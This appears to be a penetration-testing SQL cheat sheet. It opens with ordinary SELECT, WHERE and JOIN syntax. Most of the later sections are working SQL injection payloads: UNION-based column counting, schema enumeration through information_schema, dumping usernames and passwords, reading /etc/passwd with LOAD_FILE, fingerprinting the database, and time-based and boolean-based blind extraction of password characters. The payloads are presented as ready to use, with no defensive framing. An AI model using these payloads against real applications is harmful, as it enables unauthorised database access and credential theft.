# SQL Cheat Sheet

## SELECT Basics
```sql
SELECT * FROM users;
SELECT col1, col2 FROM table;
SELECT DISTINCT col FROM table;
SELECT COUNT(*) FROM table;
SELECT TOP 10 * FROM table;        -- MSSQL
SELECT * FROM table LIMIT 10;      -- MySQL, PostgreSQL
SELECT * FROM table FETCH FIRST 10 ROWS ONLY; -- Oracle, DB2
SELECT * FROM table WHERE ROWNUM <= 10; -- Oracle
```

## WHERE Clauses
| Operator | Example |
|----------|---------|
| `=` | `WHERE name = 'admin'` |
| `!=` / `<>` | `WHERE id <> 1` |
| `LIKE` | `WHERE name LIKE '%admin%'` |
| `IN` | `WHERE role IN ('admin','user')` |
| `BETWEEN` | `WHERE id BETWEEN 1 AND 10` |
| `AND/OR` | `WHERE active=1 AND role='admin'` |
| `IS NULL` | `WHERE email IS NULL` |
| `IS NOT NULL` | `WHERE email IS NOT NULL` |
| `EXISTS` | `WHERE EXISTS (SELECT 1 FROM table)` |

## JOINs
```sql
-- INNER JOIN
SELECT u.name, o.id FROM users u INNER JOIN orders o ON u.id = o.user_id;

-- LEFT JOIN
SELECT u.name, o.id FROM users u LEFT JOIN orders o ON u.id = o.user_id;

-- RIGHT JOIN
SELECT u.name, o.id FROM users u RIGHT JOIN orders o ON u.id = o.user_id;

-- FULL OUTER JOIN
SELECT u.name, o.id FROM users u FULL OUTER JOIN orders o ON u.id = o.user_id;

-- CROSS JOIN
SELECT * FROM table1 CROSS JOIN table2;

-- SELF JOIN
SELECT a.name, b.name FROM users a JOIN users b ON a.manager_id = b.id;
```

## UNION Injection Syntax
```sql
-- Basic UNION (same column count)
SELECT name,pass FROM users UNION SELECT name,pass FROM admins;

-- Determine column count
' UNION SELECT NULL--     -- 1 column
' UNION SELECT NULL,NULL-- -- 2 columns
' ORDER BY 1--            -- also columns
' ORDER BY 2--
' ORDER BY 3--            -- error = 2 columns

-- Find string columns
' UNION SELECT 'a',NULL,NULL--  -- test first col
' UNION SELECT NULL,'a',NULL--  -- test second col
' UNION SELECT NULL,NULL,'a'--  -- test third col

-- Data extraction
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,database(),3--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
```

## Database Functions
| Function | Description | DB |
|----------|-------------|-----|
| `@@version` | DB version | MSSQL, MySQL |
| `version()` | DB version | MySQL, PostgreSQL |
| `database()` | Current DB | MySQL |
| `current_database()` | Current DB | PostgreSQL |
| `DB_NAME()` | Current DB | MSSQL |
| `user()` | Current user | MySQL |
| `current_user` | Current user | PostgreSQL, MSSQL |
| `@@servername` | Server name | MSSQL |
| `LOAD_FILE('/etc/passwd')` | Read file | MySQL |
| `GROUP_CONCAT(col)` | Concatenate rows | MySQL |
| `string_agg(col,',')` | Concatenate rows | PostgreSQL |
| `STRING_AGG(col,',')` | Concatenate rows | MSSQL |
| `CAST('1' AS int)` | Type cast | All |
| `substring(col,1,1)` | Substring | All |
| `LENGTH(col)` | String length | All |
| `ASCII('A')` | Char code | MySQL, MSSQL |
| `ORD('A')` | Char code | MySQL |
| `CHR(65)` / `CHAR(65)` | Code to char | All |
| `SLEEP(5)` | Time delay (sec) | MySQL |
| `WAITFOR DELAY '0:0:5'` | Time delay | MSSQL |
| `pg_sleep(5)` | Time delay | PostgreSQL |
| `BENCHMARK(1000000,MD5('a'))` | Heavy computation | MySQL |
| `CURRENT_TIMESTAMP` | Current time | All |

## Comment Syntax
| Database | Inline | Multi-line |
|----------|--------|------------|
| MySQL | `-- ` (space) | `/* comment */` |
| MSSQL | `--` | `/* */` |
| PostgreSQL | `--` | `/* */` |
| Oracle | `--` | `/* */` |
| SQLite | `--` | `/* */` |

## Identifying Database Type
```sql
-- MySQL
' UNION SELECT @@version, NULL--
CONCAT('a','b')

-- MSSQL
' UNION SELECT @@version, NULL--
' WAITFOR DELAY '0:0:5'--

-- PostgreSQL
' UNION SELECT version(), NULL--
' UNION SELECT CURRENT_TIMESTAMP, NULL--

-- Oracle
' UNION SELECT banner FROM v$version--
' UNION SELECT 'a' FROM dual--
```

## Information Schema (MySQL)
```sql
-- Tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database();

-- Columns
SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users';

-- Database names
SELECT schema_name FROM information_schema.schemata;

-- All tables all databases
SELECT table_schema, table_name FROM information_schema.tables WHERE table_type='BASE TABLE';
```

## Time-Based Blind Injection
```sql
-- MySQL
' AND IF(SUBSTRING(user(),1,1)='r', SLEEP(5), 0)--

-- MSSQL
' IF (ASCII(SUBSTRING((SELECT db_name()),1,1)) = 100) WAITFOR DELAY '0:0:5'--

-- PostgreSQL
' AND (SELECT CASE WHEN (current_user LIKE 'r%') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

## Boolean-Based Blind
```sql
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1) = 'a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 90--
```
